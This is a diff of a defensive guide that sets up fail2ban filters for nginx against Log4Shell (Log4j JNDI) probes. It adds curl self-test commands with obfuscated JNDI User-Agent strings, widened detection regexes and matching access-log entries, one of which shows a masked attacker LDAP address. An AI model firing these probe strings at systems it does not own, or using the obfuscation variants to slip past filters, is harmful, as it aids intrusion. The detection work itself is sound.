@@ -118,9 +118,31 @@ curl -A '${jndi:ldap' -skD - http://$domain
 curl -A '${jndi:ldap' -skD - http://$domain/log4j.html
 curl -A '${jndi:ldap' -Ik http://$domain
 curl -A '${jndi:ldap' -Ik http://$domain/log4j.html
+
+curl -X GET -A '${jndi:ldap:/' -skD - https://$domain
+curl -X GET -A '${jndi:rmi:/' -skD - https://$domain
+curl -X GET -A '${jndi:ldaps:/' -skD - https://$domain
+curl -X GET -A '${jndi:dns:/' -skD - https://$domain
+curl -X GET -A '/$%7bjndi:' -skD - https://$domain
+curl -X GET -A '%24%7bjndi:' -skD - https://$domain
+curl -X GET -A '$%7Bjndi:' -skD - https://$domain
+curl -X GET -A '%2524%257Bjndi' -skD - https://$domain
+curl -X GET -A '%2F%252524%25257Bjndi%3A' -skD - https://$domain
+curl -X GET -A '${jndi:${lower:' -skD - https://$domain
+curl -X GET -A '${::-j}${' -skD - https://$domain
+curl -X GET -A '${jndi:nis' -skD - https://$domain
+curl -X GET -A '${jndi:nds' -skD - https://$domain
+curl -X GET -A '${jndi:corba' -skD - https://$domain
+curl -X GET -A '${jndi:iiop' -skD - https://$domain
+curl -X GET -A '${${env:BARFOO:-j}' -skD - https://$domain
+curl -X GET -A '${::-l}${::-d}${::-a}${::-p}' -skD - https://$domain
+curl -X GET -A '${base64:JHtqbmRp' -skD - https://$domain
+curl -X GET -A '/Basic/Command/Base64/' -skD - https://$domain
 ```
 
 Testing fail2ban regex for filter action `/etc/fail2ban/filter.d/nginx-log4j.conf`. Notice while testing, live request was logged for `/$%7Bjndi:ldap://45.xxx.xxx.xxx:1389/Exploit%7D` so readjusted my fail2ban filter action to account for it in future. Also regex accounts for attackers using invalid methods i.e. WHATEVER rather than just match on GET request methods.
+
+This is just an excerpt with some entries removed to make it easier to read.
 
 ```
 fail2ban-regex "/home/nginx/domains/log4j.domain.com/log/access.log" /etc/fail2ban/filter.d/nginx-log4j.conf --print-all-matched
@@ -136,10 +158,10 @@ Use         encoding : UTF-8
 Results
 =======
 
-Failregex: 22 total
+Failregex: 56 total
 |-  #) [# of hits] regular expression
-|   1) [15] ^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\$?\{?jndi:(ldap[s]?|rmi|dns|iiop|corba|nds|http|\$\{lower).*
-|   2) [7] ^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\$?\{?(lower:j(ndi)?|{::-j}|{::-n}|{::-d}|{::-i}|{lower:rmi}|env:ENV_NAME).*
+|   1) [25] ^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\$?\{?jndi:(ldap[s]?|rmi|dns|iiop|corba|nds|http|\$\{lower).*
+|   2) [31] ^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\$?\{?((lower|upper):j(ndi)?|{::-j}|{::-n}|{::-d}|{::-i}|{(lower|upper):(rmi|n|d|i|ı)}|env:ENV_NAME|env:BARFOO:-j|7(b|B)j|base64:JHtqbmRp|\/Basic\/Command\/Base64\/).*
 `-
 
 Ignoreregex: 0 total
@@ -175,6 +197,15 @@ Lines: 15 lines, 0 ignored, 15 matched, 0 missed
 |  xxx.xxx.xxx.xxx - - [13/Dec/2021:12:20:38 +0000] "GET /log4j.html HTTP/1.1" 404 146 "-" "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}"
 |  xxx.xxx.xxx.xxx - - [13/Dec/2021:12:26:16 +0000] "GET /log4j.html HTTP/1.1" 404 146 "-" "(${${::-n}$"
 |  xxx.xxx.xxx.xxx - - [13/Dec/2021:12:30:58 +0000] "GET /log4j.html HTTP/1.1" 404 146 "-" "${lower:rmi}"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:09:30:38 +0000] "GET / HTTP/2.0" 200 6592 "-" "${base64:JHtqbmRp"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:09:30:45 +0000] "POST / HTTP/2.0" 200 6592 "-" "${base64:JHtqbmRp"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:10:02:15 +0000] "GET / HTTP/2.0" 200 6592 "-" "${base64:JHtqbmRp"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:10:04:32 +0000] "GET / HTTP/2.0" 200 6592 "-" "/$%7bjndi:"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:10:04:49 +0000] "GET / HTTP/2.0" 200 6592 "-" "%24%7bjndi:"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:10:05:05 +0000] "GET / HTTP/2.0" 200 6592 "-" "$%7Bjndi:"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:10:05:17 +0000] "GET / HTTP/2.0" 200 6592 "-" "%2F%252524%25257Bjndi%3A"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:10:05:33 +0000] "GET / HTTP/2.0" 200 6592 "-" "%2F%252524%25257Bjndi%3A"
+|  xxx.xxx.xxx.xxx - - [14/Dec/2021:10:05:55 +0000] "GET / HTTP/2.0" 200 6592 "-" "/Basic/Command/Base64/"
 `-
 ```
 
@@ -262,7 +293,7 @@ Debug output check for `nginx-log4j` filter action
 fail2ban-client -d | grep "nginx-log4j'"
 ['add', 'nginx-log4j', 'auto']
 ['set', 'nginx-log4j', 'usedns', 'warn']
-['multi-set', 'nginx-log4j', 'addfailregex', ['^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\\$?\\{?jndi:(ldap[s]?|rmi|dns|iiop|corba|nds|http|\\$\\{lower).*', '^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\\$?\\{?(lower:j(ndi)?|{::-j}|{::-n}|{::-d}|{::-i}|{lower:rmi}|env:ENV_NAME).*']]
+['multi-set', 'nginx-log4j', 'addfailregex', ['^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\\$?\\{?jndi:(ldap[s]?|rmi|dns|iiop|corba|nds|http|\\$\\{lower).*', '^<HOST> .*"(GET|HEAD|POST|PUT|PATCH|DELETE|.*).*\\$?\\{?((lower|upper):j(ndi)?|{::-j}|{::-n}|{::-d}|{::-i}|{(lower|upper):(rmi|n|d|i|\xc4\xb1)}|env:ENV_NAME|env:BARFOO:-j|7(b|B)j|base64:JHtqbmRp|\\/Basic\\/Command\\/Base64\\/).*']]
 ['set', 'nginx-log4j', 'maxmatches', 1]
 ['set', 'nginx-log4j', 'maxretry', 1]
 ['set', 'nginx-log4j', 'addignoreip', '127.0.0.1/8', '::1', 'xxx.xxx.xxx.xxx', 'xxx.xxx.xxx.xxx']
